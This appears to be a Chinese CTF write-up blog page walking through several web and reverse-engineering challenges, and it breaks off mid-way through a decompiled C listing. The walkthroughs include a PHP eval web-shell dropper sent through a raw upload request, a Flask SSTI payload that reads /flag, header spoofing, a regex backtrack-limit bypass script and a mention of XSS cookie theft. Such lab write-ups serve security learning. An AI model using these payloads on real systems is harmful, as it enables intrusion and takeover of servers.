title="hardphp"></a>hardphp</h2><p>进入题目什么都没有，只有一句话<code>尝试大声喊出v我50!!!我就会给你flag</code><br>只能扫后台了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">~$ dirsearch -u http://43.248.97.213:30090/</span><br><span class="line"></span><br><span class="line">  _|. _ _  _  _  _ _|_    v0.4.2</span><br><span class="line"> (_||| _) (/_(_|| (_| )</span><br><span class="line"></span><br><span class="line">Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927</span><br><span class="line"></span><br><span class="line">Output File: /home/xr/.dirsearch/reports/43.248.97.213-30090/-_24-10-28_22-14-33.txt</span><br><span class="line"></span><br><span class="line">Error Log: /home/xr/.dirsearch/logs/errors-24-10-28_22-14-33.log</span><br><span class="line"></span><br><span class="line">Target: http://43.248.97.213:30090/</span><br><span class="line"></span><br><span class="line">[22:14:33] Starting:</span><br><span class="line">[22:14:37] 403 -  223B  - /.htaccess.orig</span><br><span class="line">[22:14:37] 403 -  225B  - /.htaccess.sample</span><br><span class="line">[22:14:37] 403 -  223B  - /.htaccess.bak1</span><br><span class="line">[22:14:37] 403 -  220B  - /.ht_wsr.txt</span><br><span class="line">[22:14:37] 403 -  223B  - /.htaccess.save</span><br><span class="line">[22:14:37] 403 -  224B  - /.htaccess_extra</span><br><span class="line">[22:14:38] 403 -  221B  - /.htaccess_sc</span><br><span class="line">[22:14:38] 403 -  223B  - /.htaccess_orig</span><br><span class="line">[22:14:38] 403 -  214B  - /.html</span><br><span class="line">[22:14:38] 403 -  219B  - /.htpasswds</span><br><span class="line">[22:14:38] 403 -  221B  - /.htaccessBAK</span><br><span class="line">[22:14:38] 403 -  221B  - /.htaccessOLD</span><br><span class="line">[22:14:38] 403 -  213B  - /.htm</span><br><span class="line">[22:14:38] 403 -  222B  - /.htaccessOLD2</span><br><span class="line">[22:14:38] 403 -  220B  - /.httr-oauth</span><br><span class="line">[22:14:38] 403 -  223B  - /.htpasswd_test</span><br><span class="line">[22:15:05] 200 -  304B  - /index.php</span><br><span class="line">[22:15:05] 200 -  304B  - /index.php/login/</span><br><span class="line">[22:15:17] 403 -  222B  - /server-status</span><br><span class="line">[22:15:17] 403 -  223B  - /server-status/</span><br><span class="line">[22:15:25] 200 -  825B  - /www.zip</span><br><span class="line"></span><br><span class="line">Task Completed</span><br></pre></td></tr></table></figure><p> 扫出来三个，其中<a href="http://www.zip是网站的备份/">www.zip是网站的备份</a><br>解压之后发现有个<code>flagflaghhh.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">error_reporting(<span class="number">0</span>);  </span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);  </span><br><span class="line">  </span><br><span class="line">$input = $_POST[<span class="string">&#x27;a&#x27;</span>];  </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($input)) &#123;  </span><br><span class="line">    <span class="keyword">if</span> (substr($input, <span class="number">0</span>, <span class="number">5</span>) == <span class="string">&quot;vme50&quot;</span> <span class="keyword">and</span> substr($input, <span class="number">-1</span>, <span class="number">1</span>) == <span class="string">&quot;!&quot;</span>) &#123;  </span><br><span class="line">        <span class="keyword">if</span> ($input == <span class="string">&quot;vme50!&quot;</span>) &#123;  </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Speak a little louder, I can&#x27;t hear you!&quot;</span>);  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/vme50.+?!/is&#x27;</span>, $input)) &#123;  </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;xing bu xing a.Speak much louder!&quot;</span>);  </span><br><span class="line">        &#125;        system(<span class="string">&quot;cat /flag&quot;</span>);  </span><br><span class="line">    &#125; <span class="keyword">else</span>  </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Bie lai zhan bian!!!&quot;</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对传入的a参数有三个条件</p><ol><li><p>以<code>vme50</code>为开头，以感叹号为末尾</p></li><li><p>不可以是<code>vme50</code></p></li><li><p>不可以满足正则表达式<code>/vme50.+?!/is</code>，该正则表达式的意思是匹配以<code>vme50</code>开头，以感叹号为末尾，且数字0后面有若干个零的字符串，一旦匹配到就算失败</p></li><li><p><code>/</code>：正则表达式的开始和结束标记。</p></li><li><p><code>vme50</code>：字面意义上的字符串 “vme50”，表示匹配文本中包含 “vme50” 的部分。</p></li><li><p><code>.</code>：点号（<code>.</code>）在正则表达式中是一个特殊字符，表示匹配任意单个字符（除了换行符）。</p></li><li><p><code>+</code>：加号（<code>+</code>）表示前面的字符（在这个例子中是点号 <code>.</code>）出现一次或多次。</p></li><li><p><code>?</code>：问号（<code>?</code>）在这里与 <code>+</code> 结合使用，表示前面的字符（点号 <code>.</code>）出现一次或多次，但尽可能少地匹配，这是一种非贪婪匹配。</p></li><li><p><code>!</code>：感叹号（<code>!</code>）在这里是一个普通字符，表示匹配文本中包含 <code>!</code> 的部分。</p></li><li><p><code>/is</code>：这是正则表达式的修饰符部分，<code>i</code> 表示不区分大小写，<code>s</code> 表示点号 <code>.</code> 可以匹配任意字符，包括换行符。</p></li></ol><p>仔细观察就会发现条件2和条件3冲突了，因此绕不过preg_match<br>但是函数preg_match存在一个限制，就是匹配的次数，超过一定次数的匹配会直接返回FALSE，这个限制一般是100万<br>所以</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://43.248.97.213:30090/flagflagflaghhh.php&quot;</span></span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="comment">#&#x27;a&#x27;: &#x27;vme50&#x27;+&#x27;!&#x27;*279620100</span></span><br><span class="line">    <span class="string">&#x27;a&#x27;</span>: <span class="string">&#x27;vme50&#x27;</span>+<span class="string">&#x27;0&#x27;</span>*<span class="number">1000000</span>+<span class="string">&#x27;!&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">res = requests.post(url=url, data=data)</span><br><span class="line">print(res.text)</span><br></pre></td></tr></table></figure><p><code>flag&#123;haHa_tHiS_Is_V_mE50_F1@G&#125;</code></p><h2 id="KFC"><a href="#KFC" class="headerlink" title="KFC"></a>KFC</h2><blockquote><p> 主要考点：HTTP header各字段的含义及格式</p></blockquote><p>进入题目连接，除了一张无意义的图片之外就是<code>Are you come from localhost?</code><br>猜测修改XFF，即<code>X-Forwarded-For: 127.0.0.1</code></p><p>发包返回<code>Are you jump from KFC&#39;s website?(http:****.cn)</code><br>猜测修改Referer，搜索kfc的网址<code>https://kfcapp.cn/</code>，即<code>Referer: https://kfcapp.cn/</code></p><p>发包返回<code>Have you v me 50?</code><br>这下不懂了，但是仔细观察发现返回的包中header多了一个money的字段</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">HTTP&#x2F;1.1 200 OK</span><br><span class="line">Date: Sat, 26 Oct 2024 17:57:44 GMT</span><br><span class="line">Server: Apache&#x2F;2.4.10 (Debian) PHP&#x2F;5.4.45</span><br><span class="line">X-Powered-By: PHP&#x2F;5.4.45</span><br><span class="line">money: 0</span><br><span class="line">Vary: Accept-Encoding</span><br><span class="line">Content-Length: 106</span><br><span class="line">Keep-Alive: timeout&#x3D;5, max&#x3D;100</span><br><span class="line">Connection: Keep-Alive</span><br><span class="line">Content-Type: text&#x2F;html</span><br><span class="line"></span><br><span class="line">&lt;p style&#x3D;&quot;text-align: center;&quot;&gt;&lt;img src&#x3D;&quot;.&#x2F;v50.jpg&quot; alt&#x3D;&quot;&quot; width&#x3D;132px height&#x3D;188px&gt; &lt;&#x2F;p&gt;Have you v me 50?</span><br></pre></td></tr></table></figure><p>故猜测在header增加一个money的字段，值为50，即<code>money: 50</code></p><p><code>flag&#123;0k_!_G1v3_Y0u_th3_f1l@g_!_!&#125; </code></p><h2 id="kk园区审核员"><a href="#kk园区审核员" class="headerlink" title="kk园区审核员"></a>kk园区审核员</h2><p><code>善良的出题人组织了一次kk园区的参观活动，现在收集有意向前往的人员信息，提交后工作人员会第一时间审核哦，审核通过还能得到审核的美味曲奇奖励！</code></p><p>填表 - 提交 - 审核cookie<br>猜测是xss cookie外带</p><ul><li>找xss平台</li><li>复制payload并填表</li><li>提交并返回xss平台看记录</li></ul><p><a href="https://xssaq.com/login/">XSS平台-XSS测试网站-仅用于安全免费测试 (xssaq.com)</a></p><h2 id="reallyExpensive"><a href="#reallyExpensive" class="headerlink" title="reallyExpensive"></a>reallyExpensive</h2><p><img src="https://s2.loli.net/2024/11/05/7DyE3iWUVufhmX4.png" class="lazyload" data-srcset="https://s2.loli.net/2024/11/05/7DyE3iWUVufhmX4.png" srcset="data:image/png;base64,666" alt="Pasted image 20241026145214.png"><br>给了十块钱的余额要买好贵的flag<br>抓包改购买的数目<br><img src="https://s2.loli.net/2024/11/05/b1J2kXoOKpUf6c7.png" class="lazyload" data-srcset="https://s2.loli.net/2024/11/05/b1J2kXoOKpUf6c7.png" srcset="data:image/png;base64,666" alt="Pasted image 20241026145318.png"></p><p><code>flag&#123;^==^Y0uG@t$(t]$[r)^u^(e)-F10g!^&lt;&gt;^&#125;</code></p><h2 id="upload-quick"><a href="#upload-quick" class="headerlink" title="upload_quick"></a>upload_quick</h2><p>进入页面什么也干不了，没有找到文件上传的路径<br>文件上传的页面藏在js文件里</p><p>根据题目猜测条件竞争</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;Upl00000000ad.php HTTP&#x2F;1.1</span><br><span class="line">Host: 43.248.97.213:30014</span><br><span class="line">Content-Length: 331</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;127.0.0.0 Safari&#x2F;537.36 Edg&#x2F;127.0.0.0</span><br><span class="line">Origin: http:&#x2F;&#x2F;43.248.97.213:30014</span><br><span class="line">Content-Type: multipart&#x2F;form-data; boundary&#x3D;----WebKitFormBoundaryY7TKFDA8ZwPEXpcS</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.7</span><br><span class="line">Referer: http:&#x2F;&#x2F;43.248.97.213:30014&#x2F;Upl00000000ad.php</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9,en;q&#x3D;0.8,en-GB;q&#x3D;0.7,en-US;q&#x3D;0.6</span><br><span class="line">Cookie: JSESSIONID&#x3D;886AD2DD7B34B204841F70E0D9696242</span><br><span class="line">Connection: keep-alive</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryY7TKFDA8ZwPEXpcS</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;upload_file&quot;; filename&#x3D;&quot;cmd.php&quot;</span><br><span class="line">Content-Type: application&#x2F;octet-stream</span><br><span class="line"></span><br><span class="line">&lt;?php fputs(fopen(&#39;shell.php&#39;,&#39;w&#39;),&#39;&lt;?php @eval($_POST[cmd]); ?&gt;&#39; ); ?&gt;</span><br><span class="line">------WebKitFormBoundaryY7TKFDA8ZwPEXpcS</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;submit&quot;</span><br><span class="line"></span><br><span class="line">ä¸ä¼ </span><br><span class="line">------WebKitFormBoundaryY7TKFDA8ZwPEXpcS--</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>重复发包的同时访问这个页面，生成shell.php，然后远程连接就可以了</p><p><code>flag&#123;9d097988-5eae-4c3b-86ac-d9b53ce4f340&#125;</code></p><h2 id="你买车票没"><a href="#你买车票没" class="headerlink" title="你买车票没"></a>你买车票没</h2><p>题目是一个登录框，需要输入账号密码，但是好像不是sql注入（因为测不出来）<br>每次提交都会弹窗<code>xxx,没买车票不能上车!!!</code><br>但是在返回的页面中并没有看到js代码或者请求的js文件<br><img src="https://s2.loli.net/2024/11/05/RAQpXqnZdsByFg4.png" class="lazyload" data-srcset="https://s2.loli.net/2024/11/05/RAQpXqnZdsByFg4.png" srcset="data:image/png;base64,666" alt="Pasted image 20241031215016.png"></p><p>一开始以为是使用php动态生成的js代码，但是没有思路<br>后面经过摸索发现是ssti模板注入，因为每次输入的用户名都会回显，所以可以使用<code>&#123;&#123; 4-1 &#125;&#125;</code>这样的输入测试，如果返回3就说明存在ssti模板注入<br><img src="https://s2.loli.net/2024/11/05/8ztdjws7mGfyO5J.png" class="lazyload" data-srcset="https://s2.loli.net/2024/11/05/8ztdjws7mGfyO5J.png" srcset="data:image/png;base64,666" alt="Pasted image 20241031215101.png"></p><p>确定了存在模板注入之后，还要确定怎么写payload<br><a href="https://xz.aliyun.com/t/3679?time__1311=n4+xnii=oGqmqDK0QDODlx6e0=bYhq3+hS+iD">flask之ssti模版注入从零到入门 - 先知社区 (aliyun.com)</a></p><p>payload有很多种，一般是从字符串或者列表出发，向上找基类，然后从基类往下找可以读取文件的函数<br>这里使用的payload：<code>&#123;&#123;"".__class__.__bases__[0].__subclasses__()[99]['get_data'](0,"/flag")&#125;&#125;</code></p><p>一般到subclasses之后就需要手动找目标函数，然后传入需要读的文件的路径，这里找到的是<code>FileLoader</code><br><img src="https://s2.loli.net/2024/11/05/Wi46qrVlchyZwt1.png" class="lazyload" data-srcset="https://s2.loli.net/2024/11/05/Wi46qrVlchyZwt1.png" srcset="data:image/png;base64,666" alt="Pasted image 20241031215137.png"></p><p><code>XSCTF&#123;SsT1_MilKTea_m1LktEa!&#125;</code></p><h2 id="隐秘的backdoor"><a href="#隐秘的backdoor" class="headerlink" title="隐秘的backdoor"></a>隐秘的backdoor</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">error_reporting(<span class="number">0</span>);  </span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);  </span><br><span class="line">$cmd = $_POST[<span class="string">&#x27;cmd&#x27;</span>];  </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;cmd&#x27;</span>]))&#123;    phpinfo();  </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;不要这样！TuT&quot;</span>);  </span><br><span class="line">&#125; <span class="keyword">else</span> &#123;    $cmd = $_POST[<span class="string">&#x27;cmd&#x27;</span>];  </span><br><span class="line">    <span class="keyword">eval</span>($cmd);  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>查询了很多绕过的方式，还是不行<br>然后看了看php的版本，查到了这个版本的漏洞</p><p><img src="https://s2.loli.net/2024/11/05/jpeT8Ns1dAkIufM.png" class="lazyload" data-srcset="https://s2.loli.net/2024/11/05/jpeT8Ns1dAkIufM.png" srcset="data:image/png;base64,666" alt="Pasted image 20241026174307.png"></p><p>具体上网搜</p><p><code>flag&#123;B@ck_do0r_!_B4ck_d0or_!&#125;</code></p><h2 id="calculate"><a href="#calculate" class="headerlink" title="calculate"></a>calculate</h2><p>查壳，发现upx，<code>upx.exe -d calculate.exe</code><br>然后扔进ida，发现这么一个函数<br><img src="https://s2.loli.net/2024/11/05/JsoIkSvtbaWhfqP.png" class="lazyload" data-srcset="https://s2.loli.net/2024/11/05/JsoIkSvtbaWhfqP.png" srcset="data:image/png;base64,666" alt="Pasted image 20241025211214.png"></p><p>百度下叫约束求解（看起来有点像矩阵运算）<br>1000多行手工提取不实际，写个脚本处理下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;asd.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    content = f.readlines()</span><br><span class="line"></span><br><span class="line">tmp = <span class="string">&#x27;&#x27;</span></span><br><span class="line">final = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> content:</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;return 0i64;&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> i:</span><br><span class="line">        tmp += i.strip()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        final.append(tmp)</span><br><span class="line">        tmp = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">print(final)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;tmp1.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> final:</span><br><span class="line">        f.write(i+<span class="string">&#x27;\n&#x27;</span>)</span><br></pre></td></tr></table></figure><p>初步处理之后手动删去前后缀，就得到了公式（字符串版）</p><p>然后使用python中一个叫z3的库，专门用来求解这种方程组<br>其中有一个方法可以将字符串版的方程转换为python可以处理的表达式</p><p>以下是一个模板</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solver_eng</span>(<span class="params">fc</span>):</span></span><br><span class="line">    <span class="comment"># 创建解释器对象</span></span><br><span class="line">    solver = Solver()</span><br><span class="line">    <span class="comment"># 添加约束方程</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(fc)):</span><br><span class="line">        solver.add(<span class="built_in">eval</span>(fc[i])) <span class="comment">#eval函数会将字符串形式的方程转换为z3模块能解析的方程</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment"># 求解并转化为字符输出，得到flag</span></span><br><span class="line">    <span class="keyword">if</span> solver.check() == sat:  <span class="comment"># check()方法用来判断是否有解，sat(即satisify)表示满足有解</span></span><br><span class="line">        ans = solver.model()  <span class="comment"># model()方法得到解</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> v:</span><br><span class="line">            print(<span class="built_in">chr</span>(ans[i].as_long()), end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="comment"># 一般不会无解，如果无解八成是未知数变量的类型不符合，或约束方程添加错误</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">&quot;no ans!&quot;</span>)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment"># 设置方程，请用脚本将条件中的所有方程处理成列表，然后赋值给fc列表（这样你就不用一个一个方程慢慢去复制了）</span></span><br><span class="line">    fc = []</span><br><span class="line">    <span class="comment"># 创建未知数变量</span></span><br><span class="line">    v = [Int(<span class="string">f&#x27;v<span class="subst">&#123;i&#125;</span>&#x27;</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(fc))]</span><br><span class="line"> </span><br><span class="line">    solver_eng(fc)</span><br></pre></td></tr></table></figure><p>根据题目修改一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;tmp1.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    content = f.readlines()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solver_eng</span>(<span class="params">fc</span>):</span></span><br><span class="line">    solver = Solver()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(fc)):</span><br><span class="line">        solver.add(<span class="built_in">eval</span>(fc[i]))</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> solver.check() == sat:</span><br><span class="line">        ans = solver.model()</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> v:</span><br><span class="line">            print(<span class="built_in">chr</span>(ans[i].as_long()), end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">     print(<span class="string">&#x27;Error&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    fc = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> content:</span><br><span class="line">        fc.append(i.strip())</span><br><span class="line">    v = [Int(<span class="string">f&#x27;v<span class="subst">&#123;i&#125;</span>&#x27;</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(fc))]</span><br><span class="line">    </span><br><span class="line">    solver_eng(fc)</span><br></pre></td></tr></table></figure><p><code>flag&#123;n0w_y0u_know_UPX!&#125;</code></p><p><a href="https://blog.csdn.net/liKeQing1027520/article/details/138047537">z3求解器脚本（CTF-reverse必备）_ctf z3-CSDN博客</a></p><h2 id="call-above-call"><a href="#call-above-call" class="headerlink" title="call_above_call"></a>call_above_call</h2><p>核心代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">// bad sp value at call has been detected, the output may be wrong!</span><br><span class="line"><span class="built_in">int</span> __cdecl main(<span class="built_in">int</span> argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">int</span> v4; // [esp<span class="number">-14</span>h] [ebp<span class="number">-90</span>h]</span><br><span class="line">  <span class="built_in">int</span> v5; // [esp<span class="number">-10</span>h] [ebp<span class="number">-8</span>Ch]</span><br><span class="line">  <span class="built_in">int</span> v6; // [esp-Ch] [ebp<span class="number">-88</span>h]</span><br><span class="line">  <span class="built_in">int</span> v7; // [esp<span class="number">-8</span>h] [ebp<span class="number">-84</span>h]</span><br><span class="line">  <span class="built_in">int</span> v8; // [esp<span class="number">-4</span>h] [ebp<span class="number">-80</span>h]</span><br><span class="line">  <span class="built_in">int</span> v9; // [esp+<span class="number">0</span>h] [ebp<span class="number">-7</span>Ch]</span><br><span class="line">  <span class="built_in">int</span> v10; // [esp+<span class="number">4</span>h] [ebp<span class="number">-78</span>h]</span><br><span class="line">  <span class="built_in">int</span> i; // [esp+<span class="number">4</span>h] [ebp<span class="number">-78</span>h]</span><br><span class="line">  <span class="built_in">int</span> v12; // [esp+<span class="number">8</span>h] [ebp<span class="number">-74</span>h]</span><br><span class="line">  char s[<span class="number">100</span>]; // [esp+Ch] [ebp<span class="number">-70</span>h] BYREF</span><br><span class="line">  unsigned <span class="built_in">int</span> v14; // [esp+<span class="number">70</span>h] [ebp-Ch]</span><br><span class="line">  <span class="built_in">int</span> *p_argc; // [esp+<span class="number">74</span>h] [ebp<span class="number">-8</span>h]</span><br><span class="line"></span><br><span class="line">  p_argc = &amp;argc;</span><br><span class="line">  v14 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  v12 = generate();</span><br><span class="line">  printf(<span class="string">&quot;input your key:&quot;</span>);</span><br><span class="line">  ((void (__stdcall *)(const char *, char *, <span class="built_in">int</span>, <span class="built_in">int</span>, <span class="built_in">int</span>, <span class="built_in">int</span>, <span class="built_in">int</span>, <span class="built_in">int</span>, <span class="built_in">int</span>, <span class="built_in">int</span>))__isoc99_scanf)(</span><br><span class="line">    <span class="string">&quot;%s&quot;</span>,</span><br><span class="line">    s,</span><br><span class="line">    v4,</span><br><span class="line">    v5,</span><br><span class="line">    v6,</span><br><span class="line">    v7,</span><br><span class="line">    v8,</span><br><span class="line">    <span class="number">1</span>,</span><br><span class="line">    v10,</span><br><span class="line">    v12);</span><br><span class="line">  <span class="keyword">if</span> ( strlen(s) != <span class="number">25</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    printf(<span class="string">&quot;Sorry!&quot;</span>);</span><br><span class="line">    exit(<span 